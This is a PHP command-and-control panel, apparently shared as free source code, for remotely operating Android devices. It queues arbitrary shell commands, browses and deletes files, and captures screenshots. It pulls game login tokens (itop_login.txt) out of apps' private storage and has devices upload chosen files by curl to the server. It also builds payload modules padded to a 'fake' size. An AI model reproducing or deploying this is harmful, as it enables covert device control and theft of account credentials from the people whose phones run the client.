//官网:泽峰.top    更多公益开源资源分享 \n TG@ASDK886 QQ1063167389\n各大源码免费分享 网络搜集 打破信息差    官方频道:https://t.me/+FDfQgP9RFdljYjFl
<?php
$cmd_dir = __DIR__ . '/devices/';
// ==================== 下载处理（必须在最前面） ====================
if (isset($_GET['dl'])) {
    $token = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['t'] ?? '');
    
    if (strpos($token, '_mod') !== false) {
        $file = __DIR__ . '/builds/module_' . str_replace('_mod', '', $token) . '.zip';
        $name = 'module.zip';
    } else {
        $file = __DIR__ . '/builds/binary_' . str_replace('_bin', '', $token) . '.sh';
        $name = $token . '.sh';
    }
    
    if (file_exists($file) && is_readable($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $name . '"');
        header('Content-Length: ' . filesize($file));
        header('Cache-Control: no-cache, no-store, must-revalidate');
        header('Pragma: no-cache');
        header('Expires: 0');
        readfile($file);
        exit;
    }
    
    http_response_code(404);
    die('文件不存在');
}


// ==================== IP查询 API ====================
if (isset($_POST['query_ip'])) {
    while (ob_get_level()) { ob_end_clean(); }
    ob_start();
    header('Content-Type: application/json; charset=utf-8');
    
    $device = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['device'] ?? '');
    
    if (empty($device)) {
        echo json_encode(['error' => '请选择设备'], JSON_UNESCAPED_UNICODE);
        exit;
    }
    

    
    $cmd_file = $cmd_dir . $device . '_cmd.txt';
    $result_file = $cmd_dir . $device . '_result.txt';
    @unlink($result_file);
    clearstatcache();
    
    $cmd = 'curl -s cip.cc 2>&1';
    file_put_contents($cmd_file, $cmd);
    $cmd_time = time();
    $result = null;
    
    for ($i = 0; $i < 20; $i++) {
        sleep(1);
        clearstatcache();
        if (file_exists($result_file) && filemtime($result_file) >= $cmd_time) {
            $content = @file_get_contents($result_file);
            if ($content !== false && !empty($content)) {
                $result = json_decode($content, true);
                if ($result && isset($result['output'])) break;
            }
        }
    }
    
    if (!$result || !isset($result['output'])) {
        echo json_encode(['error' => '设备无响应或查询超时'], JSON_UNESCAPED_UNICODE);
        exit;
    }
    
    $output = $result['output'] ?? '';
    
    // 解析输出，去掉URL行
    $lines = explode("\n", $output);
    $filtered_lines = [];
    foreach ($lines as $line) {
        $line = trim($line);
        if (empty($line)) continue;
        // 过滤掉URL行
        if (stripos($line, 'URL') !== false && stripos($line, 'http') !== false) continue;
        $filtered_lines[] = $line;
    }
    
    $display_output = implode("\n", $filtered_lines);
    
    echo json_encode([
        'success' => true, 
        'output' => $display_output,
        'raw_output' => $output
    ], JSON_UNESCAPED_UNICODE);
    exit;
}



// ==================== 游戏授权获取 API ====================
if (isset($_POST['get_game_auth'])) {
    while (ob_get_level()) { ob_end_clean(); }
    ob_start();
    header('Content-Type: application/json; charset=utf-8');
    
    $device = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['device'] ?? '');
    $package_name = trim($_POST['package_name'] ?? '');
    
    if (empty($device)) {
        echo json_encode(['error' => '请选择设备'], JSON_UNESCAPED_UNICODE);
        exit;
    }
    
    if (empty($package_name)) {
        echo json_encode(['error' => '请输入包名'], JSON_UNESCAPED_UNICODE);
        exit;
    }
    
    if (!preg_match('/^[a-zA-Z][a-zA-Z0-9_.]+$/', $package_name)) {
        echo json_encode(['error' => '包名格式不正确'], JSON_UNESCAPED_UNICODE);
        exit;
    }
    

    

    
    $upload_temp_dir = __DIR__ . '/uploads/temp/';
    if (!is_dir($upload_temp_dir)) {
        mkdir($upload_temp_dir, 0755, true);
    }
    
    $download_token = substr(md5($user_id . '_' . $device . '_' . $package_name . '_' . time()), 0, 16);
    
    $cmd_file = $cmd_dir . $device . '_cmd.txt';
    $result_file = $cmd_dir . $device . '_result.txt';
    @unlink($result_file);
    clearstatcache();
    
    $login_file = '/data/user/0/' . $package_name . '/files/itop_login.txt';
    
    // 简化命令：检查文件是否存在，存在则读取内容
    $cmd = "if [ -f '" . str_replace("'", "'\\''", $login_file) . "' ]; then ";
    $cmd .= "echo 'FILE_FOUND'; ";
    $cmd .= "cat '" . str_replace("'", "'\\''", $login_file) . "' 2>&1; ";
    $cmd .= "echo ''; echo 'FILE_END'; ";
    $cmd .= "else ";
    $cmd .= "echo 'FILE_NOT_FOUND'; ";
    $cmd .= "fi";
    
    file_put_contents($cmd_file, $cmd);
    $cmd_time = time();
    $result = null;
    
    // 等待最多30秒
    for ($i = 0; $i < 30; $i++) {
        sleep(1);
        clearstatcache();
        if (file_exists($result_file)) {
            $mtime = filemtime($result_file);
            if ($mtime >= $cmd_time) {
                $content = @file_get_contents($result_file);
                if ($content !== false && !empty($content)) {
                    $result = json_decode($content, true);
                    if ($result && isset($result['output'])) break;
                }
            }
        }
    }
    
    if (!$result || !isset($result['output'])) {
        echo json_encode(['error' => '设备无响应，请检查设备是否在线'], JSON_UNESCAPED_UNICODE);
        exit;
    }
    
    $output = $result['output'] ?? '';
    
    if (strpos($output, 'FILE_NOT_FOUND') !== false) {
        echo json_encode([
            'success' => true, 
            'status' => 'not_found', 
            'message' => '未找到此游戏的授权数据（itop_login.txt）'
        ], JSON_UNESCAPED_UNICODE);
        exit;
    }
    
    if (strpos($output, 'FILE_FOUND') !== false) {
        // 提取文件内容（FILE_FOUND和FILE_END之间的内容）
        $start = strpos($output, 'FILE_FOUND');
        $end = strpos($output, 'FILE_END');
        
        if ($start !== false && $end !== false && $end > $start) {
            $content_start = $start + strlen('FILE_FOUND');
            $file_content = trim(substr($output, $content_start, $end - $content_start));
            
            // 保存到临时文件供下载
            $temp_file = $upload_temp_dir . $download_token;
            file_put_contents($temp_file, $file_content);
            
            $meta = [
                'original_name' => 'itop_login.txt',
                'user_id' => $user_id,
                'created_at' => time()
            ];
            file_put_contents($temp_file . '.meta', json_encode($meta, JSON_UNESCAPED_UNICODE));
            
            echo json_encode([
                'success' => true, 
                'status' => 'found', 
                'message' => '授权文件已获取',
                'download_url' => '?download_upload=1&file=' . $download_token,
                'preview' => substr($file_content, 0, 300) . (strlen($file_content) > 300 ? '...' : '')
            ], JSON_UNESCAPED_UNICODE);
            exit;
        }
        
        // 如果标记解析失败，直接返回原始输出
        $file_content = trim(str_replace('FILE_FOUND', '', $output));
        $file_content = trim(str_replace('FILE_END', '', $file_content));
        
        if (!empty($file_content)) {
            $temp_file = $upload_temp_dir . $download_token;
            file_put_contents($temp_file, $file_content);
            
            $meta = [
                'original_name' => 'itop_login.txt',
                'user_id' => $user_id,
                'created_at' => time()
            ];
            file_put_contents($temp_file . '.meta', json_encode($meta, JSON_UNESCAPED_UNICODE));
            
            echo json_encode([
                'success' => true, 
                'status' => 'found', 
                'message' => '授权文件已获取',
                'download_url' => '?download_upload=1&file=' . $download_token,
                'preview' => substr($file_content, 0, 300) . (strlen($file_content) > 300 ? '...' : '')
            ], JSON_UNESCAPED_UNICODE);
            exit;
        }
    }
    
    // 其他未知情况
    echo json_encode([
        'success' => true, 
        'status' => 'unknown', 
        'message' => '未获取到有效数据',
        'debug' => substr($output, 0, 300)
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

    


// ==================== 上传文件下载（带1分钟自动删除） ====================
if (isset($_GET['download_upload'])) {
    $file_token = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['file'] ?? '');
    $file_path = __DIR__ . '/uploads/temp/' . $file_token;
    
    if (!file_exists($file_path) || !is_readable($file_path)) {
        http_response_code(404);
        die('文件不存在或已过期');
    }
    
    // 检查文件是否过期（超过1分钟）
    $file_mtime = filemtime($file_path);
    if (time() - $file_mtime > 60) {
        @unlink($file_path);
        http_response_code(410);
        die('文件已过期');
    }
    
    $original_name = '';
    $meta_file = $file_path . '.meta';
    if (file_exists($meta_file)) {
        $meta = json_decode(@file_get_contents($meta_file), true);
        $original_name = $meta['original_name'] ?? basename($file_path);
    } else {
        $original_name = basename($file_path);
    }
    
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $original_name . '"');
    header('Content-Length: ' . filesize($file_path));
    header('Cache-Control: no-cache, no-store, must-revalidate');
    header('Pragma: no-cache');
    header('Expires: 0');
    readfile($file_path);
    exit;
}

function formatSize($bytes) {
    if ($bytes < 1024) return $bytes . ' B';
    if ($bytes < 1048576) return round($bytes / 1024, 1) . ' KB';
    if ($bytes < 1073741824) return round($bytes / 1048576, 1) . ' MB';
    return round($bytes / 1073741824, 2) . ' GB';
}

ob_start();
error_reporting(0);
ini_set('display_errors', 0);

require_once __DIR__ . '/db.php';
session_start();

if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

$user_id = $_SESSION['user_id'];
$username = $_SESSION['username'];

$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_id]);
$user = $stmt->fetch();

// 管理员权限判断
$is_admin = ($username === 'admin');

// 如果是管理员，获取所有用户列表
$all_users = [];
if ($is_admin) {
    $all_users_stmt = $pdo->query("SELECT id, username, email, device_key, api_key, build_count, created_at FROM users ORDER BY id");
    $all_users = $all_users_stmt->fetchAll();
}


// 每次访问自动覆盖密钥
$api_key = md5($username);
$pdo->prepare("UPDATE users SET api_key = ? WHERE id = ?")->execute([$api_key, $user_id]);
if (empty($user['device_key'])) {
    $device_key = 'dev_' . md5($username);
    $pdo->prepare("UPDATE users SET device_key = ? WHERE id = ?")->execute([$device_key, $user_id]);
} else {
    $device_key = $user['device_key'];
}
$_SESSION['device_key'] = $device_key;

$build_count = $user['build_count'] ?? 0;
$module_url = $user['module_url'] ?? '';
$binary_url = $user['binary_url'] ?? '';

$cmd_dir = __DIR__ . '/devices/';
if (!is_dir($cmd_dir)) mkdir($cmd_dir, 0755, true);
$TIMEOUT = 150;

// ==================== API 请求处理 ====================
if (isset($_POST['action'])) {
    while (ob_get_level()) { ob_end_clean(); }
    ob_start();
    header('Content-Type: application/json; charset=utf-8');
    
    $action = $_POST['action'];
    
    // 发送命令
    if ($action === 'send_cmd') {
        $device = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['key'] ?? '');
        $cmd = $_POST['cmd'] ?? '';
        
        if (empty($device)) {
            echo json_encode(['success' => false, 'error' => '请选择设备'], JSON_UNESCAPED_UNICODE);
            exit;
        }
        if (empty(trim($cmd))) {
            echo json_encode(['success' => false, 'error' => '命令不能为空'], JSON_UNESCAPED_UNICODE);
            exit;
        }
        

        
        $cmd_file = $cmd_dir . $device . '_cmd.txt';
        $result_file = $cmd_dir . $device . '_result.txt';
        @unlink($result_file);
        clearstatcache();
        
        if (file_put_contents($cmd_file, $cmd) !== false) {
            echo json_encode(['success' => true, 'time' => time()], JSON_UNESCAPED_UNICODE);
        } else {
            echo json_encode(['success' => false, 'error' => '命令写入失败'], JSON_UNESCAPED_UNICODE);
        }
        exit;
    }
    
    // 轮询结果
    if ($action === 'poll_result') {
        $device = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['key'] ?? '');
        $last_poll = intval($_POST['last_poll'] ?? 0);
        
        if (empty($device)) {
            echo json_encode(['has_result' => false], JSON_UNESCAPED_UNICODE);
            exit;
        }
        
        $result_file = $cmd_dir . $device . '_result.txt';
        clearstatcache();
        
        if (file_exists($result_file)) {
            $mtime = filemtime($result_file);
            if ($mtime >= $last_poll) {
                $content = @file_get_contents($result_file);
                if ($content !== false) {
                    $result = json_decode($content, true);
                    if ($result && isset($result['output'])) {
                        echo json_encode(['has_result' => true, 'result' => $result], JSON_UNESCAPED_UNICODE);
                        exit;
                    }
                }
            }
        }
        
        echo json_encode(['has_result' => false, 'debug_mtime' => file_exists($result_file) ? filemtime($result_file) : 0], JSON_UNESCAPED_UNICODE);
        exit;
    }
    
    // 请求上传文件
    if ($action === 'request_upload') {
        $device = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['key'] ?? '');
        $file_path = $_POST['path'] ?? '';
        
        if (empty($device) || empty($file_path)) {
            echo json_encode(['success' => false, 'error' => '参数错误'], JSON_UNESCAPED_UNICODE);
            exit;
        }
        

        
        // 生成上传令牌
        $upload_token = md5($user_id . '_' . $device . '_' . $file_path . '_' . time());
        $filename = basename($file_path);
        
        // 存储上传任务
        $upload_tasks_file = __DIR__ . '/uploads/upload_tasks.json';
        $tasks = [];
        if (file_exists($upload_tasks_file)) {
            $tasks = json_decode(@file_get_contents($upload_tasks_file), true) ?? [];
        }
        
        $tasks[$upload_token] = [
            'user_id' => $user_id,
            'device' => $device,
            'file_path' => $file_path,
            'filename' => $filename,
            'status' => 'pending',
            'created_at' => time(),
            'expires_at' => time() + 300 // 5分钟过期
        ];
        
        // 清理过期任务
        foreach ($tasks as $token => $task) {
            if (time() > $task['expires_at']) {
                unset($tasks[$token]);
            }
        }
        
        file_put_contents($upload_tasks_file, json_encode($tasks, JSON_UNESCAPED_UNICODE));
        
        // 发送上传命令给客户端
        $cmd_file = $cmd_dir . $device . '_cmd.txt';
        $result_file = $cmd_dir . $device . '_result.txt';
        @unlink($result_file);
        clearstatcache();
        
        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
        $script_dir = dirname($_SERVER['SCRIPT_NAME']);
        if ($script_dir == '/') $script_dir = '';
        $upload_url = $protocol . '://' . $_SERVER['HTTP_HOST'] . $script_dir . '/upload_file.php';
        
        $safe_path = str_replace("'", "'\\''", $file_path);
        $upload_cmd = "curl -s -F 'token={$upload_token}' -F 'file=@{$safe_path}' '{$upload_url}' 2>&1; echo 'UPLOAD_COMPLETE'";
        file_put_contents($cmd_file, $upload_cmd);
        
        echo json_encode([
            'success' => true,
            'token' => $upload_token,
            'message' => '上传请求已发送，等待设备上传...'
        ], JSON_UNESCAPED_UNICODE);
        exit;
    }
    
    // 轮询上传状态
    if ($action === 'poll_upload') {
        $token = preg_replace('/[^a-zA-Z0-9]/', '', $_POST['token'] ?? '');
        
        if (empty($token)) {
            echo json_encode(['status' => 'error', 'error' => '令牌无效'], JSON_UNESCAPED_UNICODE);
            exit;
        }
        
        $upload_tasks_file = __DIR__ . '/uploads/upload_tasks.json';
        if (file_exists($upload_tasks_file)) {
            $tasks = json_decode(@file_get_contents($upload_tasks_file), true) ?? [];
            
            if (isset($tasks[$token])) {
                // 检查是否属于当前用户
                if ($tasks[$token]['user_id'] != $user_id && !$is_admin) {
                    echo json_encode(['status' => 'error', 'error' => '无权访问'], JSON_UNESCAPED_UNICODE);
                    exit;
                }
                
                if ($tasks[$token]['status'] === 'completed') {
                    $download_token = $tasks[$token]['download_token'] ?? '';
                    $original_name = $tasks[$token]['filename'] ?? 'file';
                    $file_size = 0;
                    
                    $file_path = __DIR__ . '/uploads/temp/' . $download_token;
                    if (file_exists($file_path)) {
                        $file_size = filesize($file_path);
                    }
                    
                    // 清理任务记录
                    unset($tasks[$token]);
                    file_put_contents($upload_tasks_file, json_encode($tasks, JSON_UNESCAPED_UNICODE));
                    
                    echo json_encode([
                        'status' => 'completed',
                        'filename' => $original_name,
                        'download_token' => $download_token,
                        'file_size' => formatSize($file_size),
                        'download_url' => '?download_upload=1&file=' . $download_token
                    ], JSON_UNESCAPED_UNICODE);
                    exit;
                }
                
                if ($tasks[$token]['status'] === 'failed') {
                    $error_msg = $tasks[$token]['error'] ?? '上传失败';
                    unset($tasks[$token]);
                    file_put_contents($upload_tasks_file, json_encode($tasks, JSON_UNESCAPED_UNICODE));
                    
                    echo json_encode(['status' => 'failed', 'error' => $error_msg], JSON_UNESCAPED_UNICODE);
                    exit;
                }
                
                // 检查是否超时
                if (time() > $tasks[$token]['expires_at']) {
                    $tasks[$token]['status'] = 'failed';
                    $tasks[$token]['error'] = '上传超时';
                    file_put_contents($upload_tasks_file, json_encode($tasks, JSON_UNESCAPED_UNICODE));
                    unset($tasks[$token]);
                    file_put_contents($upload_tasks_file, json_encode($tasks, JSON_UNESCAPED_UNICODE));
                    
                    echo json_encode(['status' => 'failed', 'error' => '上传超时'], JSON_UNESCAPED_UNICODE);
                    exit;
                }
                
                echo json_encode(['status' => 'pending', 'waited' => time() - $tasks[$token]['created_at'] . '秒'], JSON_UNESCAPED_UNICODE);
                exit;
            }
        }
        
        echo json_encode(['status' => 'error', 'error' => '任务不存在或已过期'], JSON_UNESCAPED_UNICODE);
        exit;
    }
}

// ==================== 管理员切换用户 ====================
if (isset($_POST['admin_switch']) && $is_admin) {
    while (ob_get_level()) { ob_end_clean(); }
    ob_start();
    header('Content-Type: application/json; charset=utf-8');
    
    $target_user_id = intval($_POST['user_id'] ?? 0);
    if ($target_user_id > 0) {
        $_SESSION['user_id'] = $target_user_id;
        $_SESSION['username'] = $pdo->query("SELECT username FROM users WHERE id = $target_user_id")->fetchColumn();
        echo json_encode(['success' => true], JSON_UNESCAPED_UNICODE);
    } else {
        echo json_encode(['success' => false, 'message' => '无效用户ID'], JSON_UNESCAPED_UNICODE);
    }
    exit;
}

// ==================== 文件管理 API ====================
if (isset($_POST['browse'])) {
    while (ob_get_level()) {
        ob_end_clean();
    }
    ob_start();
    header('Content-Type: application/json; charset=utf-8');
    
    $dir = $_POST['dir'] ?? '/storage/emulated/0';
    $device = $_POST['device'] ?? '';
    
    if (empty($device)) {
        echo json_encode(['error' => '请选择设备'], JSON_UNESCAPED_UNICODE);
        exit;
    }
    

    
    $cmd_file = $cmd_dir . $device . '_cmd.txt';
    $result_file = $cmd_dir . $device . '_result.txt';
    
    @unlink($result_file);
    clearstatcache();
    
    $safe_dir = str_replace("'", "'\\''", $dir);
    $browse_cmd = "cd '$safe_dir' 2>/dev/null; echo PWD_START; pwd; echo FILE_START; ls -1p 2>&1";
    file_put_contents($cmd_file, $browse_cmd);
    
    $cmd_time = time();
    $result = null;
    $waited = 0;
    for ($i = 0; $i < 35; $i++) {
        sleep(1);
        $waited = $i + 1;
        clearstatcache();
        if (file_exists($result_file)) {
            $mtime = filemtime($result_file);
            if ($mtime >= $cmd_time) {
                $content = @file_get_contents($result_file);
                if ($content !== false && !empty($content)) {
                    $result = json_decode($content, true);
                    if ($result && isset($result['output'])) break;
                }
            }
        }
    }
    
    if (!$result || !isset($result['output'])) {
        echo json_encode(['error' => '设备无响应', 'debug' => ['waited' => $waited . '秒']], JSON_UNESCAPED_UNICODE);
        exit;
    }
    
    $output = $result['output'] ?? '';
    preg_match('/PWD_START\s*\n(.*?)\n/', $output, $pwd_match);
    $actual_dir = isset($pwd_match[1]) ? trim($pwd_match[1]) : $dir;
    
    $list_start = strpos($output, 'FILE_START');
    if ($list_start === false) {
        echo json_encode(['error' => '未收到文件列表'], JSON_UNESCAPED_UNICODE);
        exit;
    }
    
    $list_part = substr($output, $list_start + strlen('FILE_START'));
    $lines = array_values(array_filter(explode("\n", trim($list_part)), function($line) {
        return trim($line) !== '';
    }));
    
    $files = [];
    foreach ($lines as $line) {
        $line = trim($line);
        if (empty($line)) continue;
        $is_dir = (substr($line, -1) === '/');
        $name = $is_dir ? substr($line, 0, -1) : $line;
        if ($name == '.' || $name == '..') continue;
        $files[] = ['name' => $name, 'is_dir' => $is_dir, 'size' => '-', 'date' => '', 'perm' => $is_dir ? '目录' : '文件'];
    }
    
    usort($files, function($a, $b) {
        if ($a['is_dir'] != $b['is_dir']) return $a['is_dir'] ? -1 : 1;
        return strcasecmp($a['name'], $b['name']);
    });
    
    echo json_encode(['files' => $files, 'dir' => $actual_dir], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}

// ==================== 文件操作 API ====================
if (isset($_POST['file_op'])) {
    while (ob_get_level()) { ob_end_clean(); }
    ob_start();
    header('Content-Type: application/json; charset=utf-8');
    
    $device = $_POST['device'] ?? '';
    $op = $_POST['op'] ?? '';
    $path = $_POST['path'] ?? '';
    
    if (empty($device) || empty($op) || empty($path)) {
        echo json_encode(['error' => '参数错误'], JSON_UNESCAPED_UNICODE);
        exit;
    }
    

    
    $cmd_file = $cmd_dir . $device . '_cmd.txt';
    $result_file = $cmd_dir . $device . '_result.txt';
    @unlink($result_file);
    clearstatcache();
    
    $safe_path = str_replace("'", "'\\''", $path);
    $cmd = '';
    
    switch ($op) {
        case 'delete':
            $cmd = "rm -rf '$safe_path' 2>&1 && echo 'DELETE_SUCCESS' || echo 'DELETE_FAILED'";
            break;
        case 'rename':
            $new_path = $_POST['new_path'] ?? '';
            if (empty($new_path)) {
                echo json_encode(['error' => '新名称不能为空'], JSON_UNESCAPED_UNICODE);
                exit;
            }
            $safe_new = str_replace("'", "'\\''", $new_path);
            $cmd = "mv '$safe_path' '$safe_new' 2>&1 && echo 'RENAME_SUCCESS' || echo 'RENAME_FAILED'";
            break;
        case 'mkdir':
            $cmd = "mkdir -p '$safe_path' 2>&1 && echo 'MKDIR_SUCCESS' || echo 'MKDIR_FAILED'";
            break;
        case 'mkfile':
            $cmd = "touch '$safe_path' 2>&1 && echo 'MKFILE_SUCCESS' || echo 'MKFILE_FAILED'";
            break;
        default:
            echo json_encode(['error' => '未知操作'], JSON_UNESCAPED_UNICODE);
            exit;
    }
    
    file_put_contents($cmd_file, $cmd);
    $cmd_time = time();
    $result = null;
    
    for ($i = 0; $i < 20; $i++) {
        sleep(1);
        clearstatcache();
        if (file_exists($result_file) && filemtime($result_file) >= $cmd_time) {
            $content = @file_get_contents($result_file);
            if ($content !== false && !empty($content)) {
                $result = json_decode($content, true);
                if ($result && isset($result['output'])) break;
            }
        }
    }
    
    if (!$result || !isset($result['output'])) {
        echo json_encode(['success' => false, 'message' => '设备无响应，请刷新查看结果'], JSON_UNESCAPED_UNICODE);
        exit;
    }
    
    $output = $result['output'] ?? '';
    $success = false;
    switch ($op) {
        case 'delete': $success = (strpos($output, 'DELETE_SUCCESS') !== false); $msg = $success ? '删除成功' : '删除失败'; break;
        case 'rename': $success = (strpos($output, 'RENAME_SUCCESS') !== false); $msg = $success ? '重命名成功' : '重命名失败'; break;
        case 'mkdir': $success = (strpos($output, 'MKDIR_SUCCESS') !== false); $msg = $success ? '文件夹创建成功' : '文件夹创建失败'; break;
        case 'mkfile': $success = (strpos($output, 'MKFILE_SUCCESS') !== false); $msg = $success ? '文件创建成功' : '文件创建失败'; break;
        default: $msg = '操作完成';
    }
    
    echo json_encode(['success' => $success, 'message' => $msg], JSON_UNESCAPED_UNICODE);
    exit;
}

// ==================== 截屏 API ====================
if (isset($_POST['screenshot'])) {
    while (ob_get_level()) { ob_end_clean(); }
    ob_start();
    header('Content-Type: application/json; charset=utf-8');
    
    $device = $_POST['device'] ?? '';
    if (empty($device)) {
        echo json_encode(['error' => '请选择设备'], JSON_UNESCAPED_UNICODE);
        exit;
    }
    
    // 验证设备所有权
    $device_json = $cmd_dir . $device . '.json';
    $is_authorized = false;
    if (file_exists($device_json)) {
        $device_data = json_decode(@file_get_contents($device_json), true);
        if ($device_data && ($is_admin || ($device_data['api_key'] ?? '') === $api_key)) {
            $is_authorized = true;
        }
    }
    
    if (!$is_authorized) {
        echo json_encode(['error' => '无权操作此设备'], JSON_UNESCAPED_UNICODE);
        exit;
    }
    
    $cmd_file = $cmd_dir . $device . '_cmd.txt';
    $result_file = $cmd_dir . $device . '_result.txt';
    
    $filename = 'capture_' . date('Ymd_His') . '.png';
    $screenshot_path = '/storage/emulated/0/' . $filename;
    $safe_path = str_replace("'", "'\\''", $screenshot_path);
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    $script_dir = dirname($_SERVER['SCRIPT_NAME']);
    if ($script_dir == '/') $script_dir = '';
    $upload_url = $protocol . '://' . $_SERVER['HTTP_HOST'] . $script_dir . '/upload.php';
    
    @unlink($result_file);
    clearstatcache();
    
    $cmd1 = "screencap -p '$safe_path' 2>&1";
    file_put_contents($cmd_file, $cmd1);
    $cmd_time = time();
    $result = null;
    $success = false;
    
    for ($i = 0; $i < 15; $i++) {
        sleep(1);
        clearstatcache();
        if (file_exists($result_file) && filemtime($result_file) >= $cmd_time) {
            $content = @file_get_contents($result_file);
            if ($content) {
                $result = json_decode($content, true);
                if ($result && isset($result['output']) && strpos($result['output'], 'SCREENSHOT_SUCCESS') !== false) {
                    $success = true;
                    break;
                }
                if ($result && isset($result['exit_code'])) {
                    if ($result['exit_code'] === '0' || $result['exit_code'] === 0) {
                        $check_file = "ls -la '$safe_path' 2>&1";
                        @file_put_contents($cmd_file, $check_file);
                        $cmd_time2 = time();
                        for ($j = 0; $j < 5; $j++) {
                            sleep(1);
                            clearstatcache();
                            if (file_exists($result_file) && filemtime($result_file) >= $cmd_time2) {
                                $content2 = @file_get_contents($result_file);
                                if ($content2) {
                                    $result2 = json_decode($content2, true);
                                    if ($result2 && strpos($result2['output'] ?? '', $safe_path) !== false) {
                                        $success = true;
                                        break 2;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    if (!$success) {
        $check_exist = "ls -la '$safe_path' 2>&1; echo EXIT_CODE:\$?";
        @file_put_contents($cmd_file, $check_exist);
        $cmd_time3 = time();
        for ($k = 0; $k < 5; $k++) {
            sleep(1);
            clearstatcache();
            if (file_exists($result_file) && filemtime($result_file) >= $cmd_time3) {
                $content3 = @file_get_contents($result_file);
                if ($content3) {
                    $result3 = json_decode($content3, true);
                    if ($result3 && strpos($result3['output'] ?? '', $filename) !== false && 
                        (strpos($result3['output'] ?? '', 'root') !== false || strpos($result3['output'] ?? '', '-rw') !== false)) {
                        $success = true;
                        break;
                    }
                }
            }
        }
    }
    
    if (!$success) {
        echo json_encode(['error' => '截屏失败（设备可能无权限或不支持）'], JSON_UNESCAPED_UNICODE);
        exit;
    }
    
    @unlink($result_file);
    clearstatcache();
    $cmd2 = "curl -s -F 'key=$device' -F 'file=@$safe_path' '$upload_url' 2>&1; echo 'UPLOAD_END'; rm -f '$safe_path'";
    file_put_contents($cmd_file, $cmd2);
    $cmd_time = time();
    $result2 = null;
    
    for ($i = 0; $i < 60; $i++) {
        sleep(1);
        clearstatcache();
        if (file_exists($result_file) && filemtime($result_file) >= $cmd_time) {
            $content = @file_get_contents($result_file);
            if ($content !== false && !empty($content)) {
                $result2 = json_decode($content, true);
                if ($result2 && isset($result2['output'])) break;
            }
        }
    }
    
    if (!$result2 || !isset($result2['output'])) {
        echo json_encode(['error' => '上传超时，请检查网络'], JSON_UNESCAPED_UNICODE);
        exit;
    }
    
    $output = $result2['output'] ?? '';
    $end_pos = strpos($output, 'UPLOAD_END');
    $upload_response = $end_pos !== false ? trim(substr($output, 0, $end_pos)) : trim($output);
    $upload_result = json_decode($upload_response, true);
    
if ($upload_result && isset($upload_result['success']) && $upload_result['success']) {
    $uploaded_filename = $upload_result['file'] ?? $filename;
    
    // 从设备信息中获取真正的user_id，保持和upload.php一致
    $device_file = __DIR__ . '/devices/' . $device . '.json';
    $device_info = json_decode(file_get_contents($device_file), true);
    $device_user_id = $device_info['user_id'] ?? $user_id;
    
    $actual_filename = basename($uploaded_filename);
    $image_url = $protocol . '://' . $_SERVER['HTTP_HOST'] . $script_dir . '/screenshots/' . $device_user_id . '/' . $actual_filename;
        echo json_encode(['success' => true, 'image_url' => $image_url, 'filename' => $uploaded_filename], JSON_UNESCAPED_UNICODE);
    } else {
        $error_msg = $upload_result['error'] ?? $upload_response;
        if (strlen($error_msg) > 500) $error_msg = substr($error_msg, 0, 500) . '...';
        echo json_encode(['error' => '上传失败: ' . $error_msg], JSON_UNESCAPED_UNICODE);
    }
    exit;
}

// ==================== 编译处理 ====================
if (isset($_POST['build_action'])) {
    while (ob_get_level()) { ob_end_clean(); }
    ob_start();
    header('Content-Type: application/json; charset=utf-8');

    if (isset($_POST['check'])) {
        $status_file = sys_get_temp_dir() . '/build_status_' . $_POST['check'] . '.json';
        clearstatcache();
        if (file_exists($status_file)) {
            $content = @file_get_contents($status_file);
            if ($content !== false) {
                echo $content;
                exit;
            }
        }
        echo json_encode(['status' => 'building']);
        exit;
    }



    $fake_mb = isset($_POST['fake_mb']) ? intval($_POST['fake_mb']) : 0;
    if ($fake_mb < 1 || $fake_mb > 25) {
        echo json_encode(['success' => false, 'message' => '伪装大小 1-25 MB'], JSON_UNESCAPED_UNICODE);
        exit;
    }

    $build_id = date('Ymd_His') . '_' . substr(md5(uniqid()), 0, 6);
    $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
    $status_file = sys_get_temp_dir() . '/build_status_' . $build_id . '.json';
    
    @file_put_contents($status_file, json_encode(['status' => 'building', 'step' => '初始化']));

    $real_api_key = $user['api_key'] ?? '';
    $username_md5_key = md5($username);
    if (empty($real_api_key) || strlen($real_api_key) !== 32) {
        $real_api_key = $username_md5_key;
        $pdo->prepare("UPDATE users SET api_key = ? WHERE id = ?")->execute([$real_api_key, $user_id]);
    } else {
        $real_api_key = $username_md5_key;
        $pdo->prepare("UPDATE users SET api_key = ? WHERE id = ?")->execute([$real_api_key, $user_id]);
    }

    $cmd = 'nohup /usr/bin/php ' . __DIR__ . '/build_worker.php ' . 
           escapeshellarg($build_id) . ' ' . 
           escapeshellarg($user_id) . ' ' . 
           escapeshellarg($real_api_key) . ' ' . 
           $fake_mb . ' ' . 
           escapeshellarg($host) . 
           ' > /dev/null 2>&1 &';
    
    exec($cmd);

    echo json_encode([
        'success' => true,
        'status' => 'building',
        'build_id' => $build_id,
        'message' => '编译已启动'
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

// ==================== 设备管理 ====================
$message = '';
if (isset($_POST['send_cmd']) && !empty($_POST['cmd']) && !empty($_POST['device_key'])) {
    $tk = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['device_key']);
    $cmd_file = $cmd_dir . $tk . '_cmd.txt';
    if (file_put_contents($cmd_file, trim($_POST['cmd'])) !== false) {
        $message = '命令已发送';
    } else {
        $message = '命令发送失败';
    }
}

$device_list = [];
if (is_dir($cmd_dir)) {
